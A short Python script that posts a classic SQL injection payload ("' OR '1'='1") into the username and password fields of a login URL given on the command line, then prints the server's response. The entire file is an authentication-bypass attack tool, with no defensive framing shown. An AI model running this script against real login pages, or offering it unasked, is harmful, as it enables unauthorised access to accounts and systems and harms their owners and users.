import os
import sys
import requests

# Get all command-line arguments passed to this script (excluding the script name)
args = sys.argv[1:]

if args:
    web_addr = args[0]

    # Target URL
    login_url = web_addr

    # Classic SQL Injection payload
    payload = {
        "username": "' OR '1'='1",  # username = '' OR '1'='1'
        "password": "' OR '1'='1"   # password = '' OR '1'='1'
    }

    response = requests.post(login_url, data=payload)

    print("Status:", response.status_code)
    print("Body:", response.text)
